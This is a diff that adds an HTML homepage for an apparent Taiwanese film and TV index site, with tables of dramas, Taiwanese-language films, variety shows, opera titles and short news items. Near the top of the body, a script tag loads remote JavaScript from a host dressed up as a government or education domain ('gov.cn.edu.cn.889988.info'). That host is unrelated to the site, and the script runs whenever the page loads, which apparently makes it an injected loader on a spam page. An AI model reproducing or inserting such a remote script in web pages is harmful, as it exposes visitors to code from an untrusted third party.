@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>台湾佬电影网 | 台剧台片台综一网打尽，本土影视在线看</title>
+<meta name="description" content="台湾佬电影网专注台湾本土影视资源，聚合台剧、台片、台语电影、台湾综艺与闽南语戏曲，收录三立、民视、台视、八大热播内容，提供剧情介绍、演员表与分集信息，是了解台湾影视文化的专属入口。">
+<meta name="keywords" content="台湾佬电影网,台剧在线看,台湾电影,闽南语影片,台湾综艺节目,本土影视资源">
+<link rel="canonical" href="https://taiwanlaodianyingwang-zh.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+--green:#0a7c4d;
+--green-light:#12a06a;
+--green-pale:#e8f7f0;
+--gold:#d4a017;
+--ink:#222;
+--soft:#6b7280;
+--bg:#f4f6f4;
+--white:#fff;
+--line:#dfe4e0;
+--r:6px;
+}
+body{
+font-family:"Noto Sans TC","PingFang TC","Microsoft JhengHei",sans-serif;
+background:var(--bg);color:var(--ink);line-height:1.75;font-size:15px;
+}
+a{text-decoration:none;color:inherit}
+ul{list-style:none}
+.container{width:100%;max-width:1200px;margin:0 auto;padding:0 18px}
+
+/* 公告条 */
+.marquee{background:var(--ink);color:#ddd;font-size:13px;padding:7px 0;overflow:hidden;white-space:nowrap}
+.marquee span{color:var(--gold);margin-right:8px;font-weight:700}
+.marquee a{color:#bbb}
+.marquee a:hover{color:#fff}
+
+/* 头部 */
+header{background:var(--white);border-bottom:4px solid var(--green)}
+.head-inner{display:flex;align-items:center;justify-content:space-between;padding:18px 0;gap:20px}
+.brand{display:flex;align-items:baseline;gap:10px}
+.brand b{font-size:30px;font-weight:900;color:var(--green);letter-spacing:1px}
+.brand i{font-style:normal;font-size:12px;color:var(--soft);background:var(--green-pale);padding:2px 8px;border-radius:var(--r)}
+.head-search{flex:1;max-width:380px;position:relative}
+.head-search input{width:100%;padding:11px 42px 11px 14px;border:2px solid var(--line);border-radius:30px;font-size:14px;outline:none}
+.head-search input:focus{border-color:var(--green)}
+.head-search button{position:absolute;right:5px;top:50%;transform:translateY(-50%);width:34px;height:34px;border:0;border-radius:50%;background:var(--green);color:#fff;cursor:pointer}
+.head-btn a{font-size:13px;padding:8px 14px;border:1px solid var(--green);border-radius:var(--r);color:var(--green);transition:.2s}
+.head-btn a:hover{background:var(--green);color:#fff}
+
+/* 导航 */
+nav{background:var(--green)}
+nav .container{display:flex;align-items:center;gap:2px;overflow-x:auto}
+nav a{padding:13px 18px;color:rgba(255,255,255,.88);font-size:15px;font-weight:600;white-space:nowrap;border-bottom:3px solid transparent;transition:.2s}
+nav a:hover,nav a.on{color:#fff;background:rgba(255,255,255,.12);border-bottom-color:var(--gold)}
+
+/* 首屏 */
+.hero{background:linear-gradient(135deg,#064a2e 0%,#0a7c4d 55%,#12a06a 100%);color:#fff;padding:56px 0;position:relative;overflow:hidden}
+.hero::after{content:"🎬";position:absolute;right:-20px;bottom:-40px;font-size:220px;opacity:.08}
+.hero-grid{display:grid;grid-template-columns:1.4fr 1fr;gap:40px;align-items:center;position:relative;z-index:2}
+.hero h1{font-size:38px;font-weight:900;line-height:1.3;margin-bottom:14px}
+.hero h1 u{text-decoration:none;color:var(--gold)}
+.hero p{font-size:16px;color:rgba(255,255,255,.9);max-width:560px;margin-bottom:24px}
+.hero-tags{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:24px}
+.hero-tags a{background:rgba(255,255,255,.16);padding:6px 14px;border-radius:20px;font-size:13px;color:#fff;border:1px solid rgba(255,255,255,.25)}
+.hero-tags a:hover{background:var(--gold);color:#222;border-color:var(--gold)}
+.hero-stats{display:flex;gap:30px;padding-top:20px;border-top:1px solid rgba(255,255,255,.25)}
+.hero-stats div b{display:block;font-size:24px;color:var(--gold);font-weight:900}
+.hero-stats div small{font-size:12px;color:rgba(255,255,255,.8)}
+.side-card{background:rgba(255,255,255,.1);backdrop-filter:blur(6px);border:1px solid rgba(255,255,255,.2);border-radius:12px;padding:20px}
+.side-card h3{font-size:16px;color:var(--gold);margin-bottom:14px;border-left:4px solid var(--gold);padding-left:10px}
+.side-card ol{counter-reset:s}
+.side-card li{counter-increment:s;display:flex;gap:10px;padding:7px 0;border-bottom:1px dashed rgba(255,255,255,.2);font-size:14px}
+.side-card li::before{content:counter(s);background:var(--gold);color:#222;width:20px;height:20px;border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;flex-shrink:0}
+
+/* 通用板块 */
+.block{background:var(--white);border-radius:10px;padding:26px;margin:22px 0;box-shadow:0 1px 6px rgba(0,0,0,.05)}
+.block-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
+.block-head h2{font-size:20px;font-weight:800;display:flex;align-items:center;gap:10px}
+.block-head h2::before{content:"";width:6px;height:22px;background:var(--green);border-radius:3px}
+.block-head a{font-size:13px;color:var(--green);font-weight:600}
+
+/* 频道入口 */
+.channels{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px}
+.channel{position:relative;padding:22px;border-radius:10px;color:#fff;overflow:hidden;min-height:120px;display:flex;flex-direction:column;justify-content:flex-end;transition:.25s}
+.channel:hover{transform:translateY(-3px);box-shadow:0 10px 25px rgba(0,0,0,.2)}
+.channel small{font-size:12px;opacity:.85}
+.channel b{font-size:18px;margin-top:4px}
+.c1{background:linear-gradient(135deg,#0a7c4d,#12a06a)}
+.c2{background:linear-gradient(135deg,#1e5aa8,#3b82f6)}
+.c3{background:linear-gradient(135deg,#a05a00,#d97706)}
+.c4{background:linear-gradient(135deg,#7c3aed,#a855f7)}
+.c5{background:linear-gradient(135deg,#be123c,#e11d48)}
+
+/* 影片表 */
+.film-table{width:100%;border-collapse:collapse}
+.film-table th{background:var(--green-pale);color:var(--green);font-size:13px;padding:10px;text-align:left}
+.film-table td{padding:12px 10px;border-bottom:1px solid var(--line);font-size:14px}
+.film-table tr:hover{background:#fafbfa}
+.film-table .tag{font-size:11px;padding:2px 7px;border-radius:3px;background:var(--green);color:#fff;margin-right:6px}
+.film-table .tag.o{background:var(--gold);color:#222}
+.film-table .tag.b{background:#e0e7ff;color:#3730a3}
+
+/* 卡片网格 */
+.fgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:18px}
+.fcard{transition:.25s}
+.fcard:hover{transform:translateY(-4px)}
+.fcover{aspect-ratio:3/4;border-radius:8px;overflow:hidden;position:relative;display:flex;align-items:flex-end;padding:12px;color:#fff;font-weight:700;font-size:15px;text-align:center;justify-content:center}
+.fcover::before{content:"";position:absolute;inset:0;background:linear-gradient(to top,rgba(0,0,0,.85),rgba(0,0,0,.15))}
+.fcover span{position:relative;z-index:2}
+.fcard .meta{padding:8px 2px;font-size:13px;color:var(--soft)}
+.fcard .meta b{display:block;color:var(--ink);font-size:14px;margin-bottom:2px}
+.s1{background:linear-gradient(135deg,#1e3a5f,#3b6ea8)}
+.s2{background:linear-gradient(135deg,#5f1e3a,#a83b6e)}
+.s3{background:linear-gradient(135deg,#3a5f1e,#6ea83b)}
+.s4{background:linear-gradient(135deg,#5f4e1e,#a88f3b)}
+.s5{background:linear-gradient(135deg,#1e5f5f,#3ba8a8)}
+.s6{background:linear-gradient(135deg,#4a1e5f,#7c3ba8)}
+
+/* 图鉴列表 */
+.gallery{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px}
+.gitem{border:1px solid var(--line);border-radius:10px;padding:18px;transition:.2s}
+.gitem:hover{border-color:var(--green);box-shadow:0 4px 14px rgba(0,0,0,.06)}
+.gitem h4{font-size:16px;color:var(--green);margin-bottom:8px}
+.gitem p{font-size:13px;color:var(--soft);margin-bottom:6px}
+
+/* 文章区 */
+.article h3{font-size:18px;color:var(--ink);margin:22px 0 10px;border-left:4px solid var(--gold);padding-left:10px}
+.article p{margin-bottom:12px}
+.article strong{color:var(--green)}
+.two{display:grid;grid-template-columns:1fr 1fr;gap:30px}
+@media(max-width:760px){.two{grid-template-columns:1fr}}
+
+/* 站点地图 */
+.smap{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:20px}
+.smap div h4{font-size:15px;color:var(--green);margin-bottom:10px}
+.smap div a{display:block;font-size:13px;padding:4px 0;color:var(--soft)}
+.smap div a:hover{color:var(--green);padding-left:6px}
+
+/* 页脚 */
+footer{background:#14241c;color:#9ca3af;padding:44px 0 20px;margin-top:30px}
+.foot-top{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:30px;margin-bottom:30px}
+.foot-top b{font-size:22px;color:var(--green);display:block;margin-bottom:10px}
+.foot-top h4{color:#fff;font-size:15px;margin-bottom:12px}
+.foot-top li{margin-bottom:8px;font-size:13px}
+.foot-top a:hover{color:var(--gold)}
+.foot-bot{border-top:1px solid #2d4a3a;padding-top:20px;text-align:center;font-size:13px}
+.foot-bot a{color:#9ca3af}
+.foot-bot .domain{color:var(--gold);font-weight:600}
+
+/* 响应式 */
+@media(max-width:900px){
+.hero-grid{grid-template-columns:1fr}
+.hero h1{font-size:28px}
+.head-search{display:none}
+.side-card{order:-1}
+}
+@media(max-width:600px){
+.head-btn{display:none}
+.container{padding:0 14px}
+.block{padding:18px 14px}
+.film-table{font-size:13px}
+.film-table th:nth-child(3),.film-table td:nth-child(3){display:none}
+.foot-top{grid-template-columns:1fr 1fr}
+}
+@media(max-width:400px){
+.foot-top{grid-template-columns:1fr}
+.hero-stats{gap:16px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- 跑马灯 -->
+<div class="marquee">
+<span>本島訊息</span>
+<a href="#">▸ 三立华剧《海港情书》全集上线</a>　
+<a href="#">▸ 民视八点档《阿嬷的灶脚》追剧进度更新</a>　
+<a href="#">▸ 台语电影专题《我们的那卡西》新增 12 部</a>　
+<a href="#">▸ 第 61 届金马奖入围片单专区开放</a>
+</div>
+
+<!-- 头部 -->
+<header>
+<div class="container">
+<div class="head-inner">
+<div class="brand">
+<b>台湾佬电影网</b>
+<i>taiwanlaodianyingwang-zh.github.io</i>
+</div>
+<div class="head-search">
+<input type="text" placeholder="搜台剧、台语片、演员、节目名…">
+<button>搜</button>
+</div>
+<div class="head-btn"><a href="#">投稿 / 报错</a></div>
+</div>
+</div>
+</header>
+
+<!-- 主导航 -->
+<nav>
+<div class="container">
+<a href="#" class="on">首页</a>
+<a href="#taiju">台剧频道</a>
+<a href="#taipian">台语电影</a>
+<a href="#zongyi">台湾综艺</a>
+<a href="#xiqu">本土戏曲</a>
+<a href="#zixun">影视资讯</a>
+<a href="#sitemap">站点地图</a>
+</nav>
+
+<!-- 首屏 -->
+<section class="hero">
+<div class="container">
+<div class="hero-grid">
+<div>
+<h1>深耕 <u>台湾本土影视</u><br>台剧 · 台片 · 台综一站看</h1>
+<p>台湾佬电影网收录三立、民视、台视、中视、八大、公视历年经典与在播热剧，搭配台语电影、闽南语戏曲与本土综艺，用分集信息、演员阵容与剧情导读，带你读懂每一部台湾故事。</p>
+<div class="hero-tags">
+<a href="#taiju">华剧八点档</a>
+<a href="#taipian">台语老片</a>
+<a href="#zongyi">访谈综艺</a>
+<a href="#xiqu">歌仔戏</a>
+<a href="#zixun">金马专题</a>
+</div>
+<div class="hero-stats">
+<div><b>2,600+</b><small>收录条目</small></div>
+<div><b>8 频道</b><small>电视来源</small></div>
+<div><b>日更</b><small>内容维护</small></div>
+</div>
+</div>
+<div class="side-card">
+<h3>本週收視熱點</h3>
+<ol>
+<li><span>《海港情书》大结局收视破 3</span></li>
+<li><span>《阿嬷的灶脚》乡土剧回暖</span></li>
+<li><span>《我们与恶的距离 II》上线</span></li>
+<li><span>金马 61 入围名单公布</span></li>
+<li><span>台语片修复计划新增 12 部</span></li>
+</ol>
+</div>
+</div>
+</div>
+</section>
+
+<div class="container">
+
+<!-- 频道入口 -->
+<section class="block">
+<div class="block-head"><h2>内容频道</h2><a href="#sitemap">查看站点地图 →</a></div>
+<div class="channels">
+<a href="#taiju" class="channel c1"><small>本土剧 · 华剧 · 偶像剧</small><b>台剧频道</b></a>
+<a href="#taipian" class="channel c2"><small>台语片 · 闽南语电影</small><b>台语电影馆</b></a>
+<a href="#zongyi" class="channel c3"><small>谈话 · 美食 · 户外实境</small><b>台湾综艺</b></a>
+<a href="#xiqu" class="channel c4"><small>歌仔戏 · 布袋戏 · 南管</small><b>本土戏曲</b></a>
+<a href="#zixun" class="channel c5"><small>金马 · 台北电影奖 · 收视</small><b>影视资讯</b></a>
+</div>
+</section>
+
+<!-- 台剧频道 -->
+<section class="block" id="taiju">
+<div class="block-head"><h2>台剧频道</h2><a href="#">全部台剧 →</a></div>
+<table class="film-table">
+<thead>
+<tr><th>剧名</th><th>类型</th><th>播出平台</th><th>状态</th><th>热度</th></tr>
+</thead>
+<tbody>
+<tr><td><span class="tag">热播</span>海港情书</td><td>三立华剧 / 都会</td><td>三立都会台</td><td>完结</td><td>★★★★★</td></tr>
+<tr><td><span class="tag o">连载</span>阿嬷的灶脚</td><td>民视八点档 / 乡土</td><td>民视</td><td>连载中</td><td>★★★★☆</td></tr>
+<tr><td><span class="tag b">好评</span>我们与恶的距离 II</td><td>公视 / 社会写实</td><td>公视</td><td>连载中</td><td>★★★★★</td></tr>
+<tr><td><span class="tag o">连载</span>岛上书店</td><td>偶像剧 / 文艺</td><td>台视</td><td>连载中</td><td>★★★★☆</td></tr>
+<tr><td><span class="tag">经典</span>意难忘（全收录）</td><td>民视长篇 / 家族</td><td>民视</td><td>经典</td><td>★★★★☆</td></tr>
+<tr><td><span class="tag b">好评</span>茶金岁月</td><td>时代剧 / 商战</td><td>公视</td><td>完结</td><td>★★★★★</td></tr>
+</tbody>
+</table>
+</section>
+
+<!-- 台语电影 -->
+<section class="block" id="taipian">
+<div class="block-head"><h2>台语电影馆</h2><a href="#">台语片专题 →</a></div>
+<div class="fgrid">
+<div class="fcard"><div class="fcover s1"><span>金壶玉鲤</span></div><div class="meta"><b>金壶玉鲤</b>1969 · 台语片 · 戏曲改编</div></div>
+<div class="fcard"><div class="fcover s2"><span>危险的青春</span></div><div class="meta"><b>危险的青春</b>1969 · 台语片 · 社会写实</div></div>
+<div class="fcard"><div class="fcover s3"><span>白贼七</span></div><div class="meta"><b>白贼七</b>1970 · 台语片 · 民间传奇</div></div>
+<div class="fcard"><div class="fcover s4"><span>蚱蜢旦</span></div><div class="meta"><b>蚱蜢旦</b>1980 · 台语片 · 乡土喜剧</div></div>
+<div class="fcard"><div class="fcover s5"><span>一只鸟仔</span></div><div class="meta"><b>一只鸟仔哮啾啾</b>1997 · 台语片 · 新电影</div></div>
+<div class="fcard"><div class="fcover s6"><span>总舖师</span></div><div class="meta"><b>总舖师</b>2013 · 台语片 · 贺岁喜剧</div></div>
+</div>
+</section>
+
+<!-- 台湾综艺 -->
+<section class="block" id="zongyi">
+<div class="block-head"><h2>台湾综艺</h2><a href="#">综艺节目表 →</a></div>
+<div class="gallery">
+<a href="#" class="gitem"><h4>康熙来了（全期索引）</h4><p>中天综合 · 谈话节目 · 2004-2016</p><p>主持人：蔡康永 / 徐熙娣。收录完整期数与来宾索引。</p></a>
+<a href="#" class="gitem"><h4>全民最大党</h4><p>中天 · 政治模仿秀 · 2007-2012</p><p>以模仿政治人物著称，回顾台湾综艺的讽刺高峰。</p></a>
+<a href="#" class="gitem"><h4>食尚玩家</h4><p>卫视中文台 · 美食外景 · 2007-2021</p><p>走遍全台夜市、小吃与老店，美食旅行入门首选。</p></a>
+<a href="#" class="gitem"><h4>大热门</h4><p>中天 · 益智游戏 · 2013-2018</p><p>主持人吴宗宪，单元式游戏与艺人互动。</p></a>
+<a href="#" class="gitem"><h4>22 响</h4><p>公共电视 · 文化访谈</p><p>深度对话台湾导演、编剧与幕后工作者。</p></a>
+<a href="#" class="gitem"><h4>小姐不熙娣</h4><p>中天 · 谈话节目 · 2022-</p><p>小 S 回归主持，聚焦女性议题与来宾对谈。</p></a>
+</div>
+</section>
+
+<!-- 本土戏曲 -->
+<section class="block" id="xiqu">
+<div class="block-head"><h2>本土戏曲</h2><a href="#">戏曲片单 →</a></div>
+<div class="fgrid">
+<div class="fcard"><div class="fcover s4"><span>薛平贵与王宝钏</span></div><div class="meta"><b>薛平贵与王宝钏</b>歌仔戏 · 叶青歌仔戏</div></div>
+<div class="fcard"><div class="fcover s6"><span>青天难断</span></div><div class="meta"><b>青天难断</b>歌仔戏 · 杨丽花歌仔戏团</div></div>
+<div class="fcard"><div class="fcover s1"><span>云州大儒侠</span></div><div class="meta"><b>云州大儒侠</b>布袋戏 · 黄俊雄</div></div>
+<div class="fcard"><div class="fcover s3"><span>圣石传说</span></div><div class="meta"><b>圣石传说</b>霹雳布袋戏 · 2000 电影</div></div>
+</div>
+</section>
+
+<!-- 影视资讯 -->
+<section class="block article" id="zixun">
+<div class="block-head"><h2>影视资讯</h2></div>
+<div class="two">
+<div>
+<h3>第 61 届金马奖观察</h3>
+<p>本届金马奖入围名单中，台湾本土制作在剧情长片、纪录片与新导演三项表现亮眼。台湾佬电影网同步整理入围片单与过往得奖纪录，供影迷对照查阅。</p>
+<h3>台语片修复计划进度</h3>
+<p>由国家电影及视听文化中心主导的台语片修复计划，本年度新增完成 <strong>12 部</strong>影片的数位修复，涵盖 1960-1980 年代的台语剧情片与戏曲改编作品，本站已建立对应片目索引。</p>
+</div>
+<div>
+<h3>收视观察：乡土剧回暖</h3>
+<p>民视八点档近期收视回升，反映观众对本土家庭伦理与在地议题的持续关注。本站每周更新收视数据对照表。</p>
+<h3>平台合作与内容说明</h3>
+<p>本站为台湾影视内容索引与资讯平台，提供剧情介绍、演员阵容、分集信息，片源引导以合法授权渠道为主。欢迎片商与制作单位来信合作。</p>
+</div>
+</div>
+</section>
+
+<!-- 站点地图 -->
+<section class="block" id="sitemap">
+<div class="block-head"><h2>站点地图</h2></section>
+<div class="smap">
+<div>
+<h4>内容频道</h4>
+<a href="#taiju">台剧频道</a>
+<a href="#taipian">台语电影馆</a>
+<a href="#zongyi">台湾综艺</a>
+<a href="#xiqu">本土戏曲</a>
+<a href="#zixun">影视资讯</a>
+</div>
+<div>
+<h4>剧集分类</h4>
+<a href="#">华剧八点档</a>
+<a href="#">民视乡土剧</a>
+<a href="#">公视时代剧</a>
+<a href="#">偶像剧</a>
+<a href="#">迷你剧集</a>
+</div>
+<div>
+<h4>资料索引</h4>
+<a href="#">演员表</a>
+<a href="#">导演作品</a>
+<a href="#">收视排行</a>
+<a href="#">金马片单</a>
+<a href="#">年度片单</a>
+</div>
+<div>
+<h4>关于本站</h4>
+<a href="#">网站简介</a>
+<a href="#">投稿报错</a>
+<a href="#">合作洽谈</a>
+<a href="#">隐私条款</a>
+<a href="#">免责声明</a>
+</div>
+</div>
+</section>
+
+</div>
+
+<!-- 页脚 -->
+<footer>
+<div class="container">
+<div class="foot-top">
+<div>
+<b>台湾佬电影网</b>
+<p style="font-size:13px;max-width:300px">专注台湾本土影视内容索引：台剧、台语电影、台湾综艺、本土戏曲与闽南语文化节目，提供剧情导读、演员阵容与分集资料。</p>
+</div>
+<div>
+<h4>频道导航</h4>
+<ul>
+<li><a href="#taiju">台剧频道</a></li>
+<li><a href="#taipian">台语电影</a></li>
+<li><a href="#zongyi">台湾综艺</a></li>
+<li><a href="#xiqu">本土戏曲</a></li>
+</ul>
+</div>
+<div>
+<h4>资料服务</h4>
+<ul>
+<li><a href="#">收视排行</a></li>
+<li><a href="#">金马专题</a></li>
+<li><a href="#">演员索引</a></li>
+<li><a href="#">节目表</a></li>
+</ul>
+</div>
+<div>
+<h4>联络我们</h4>
+<ul>
+<li><a href="#">投稿报错</a></li>
+<li><a href="#">合作洽谈</a></li>
+<li><a href="#">商务合作</a></li>
+<li><a href="#">友站链接</a></li>
+</ul>
+</div>
+</div>
+<div class="foot-bot">
+© 2026 台湾佬电影网 · 本站官方域名：<span class="domain">taiwanlaodianyingwang-zh.github.io</span><br>
+内容为影视资讯索引用途，版权归属各电视台、制作公司与发行方所有，如有异议请联系处理
+</div>
+</div>
+</footer>
+
+</body>
+</html>
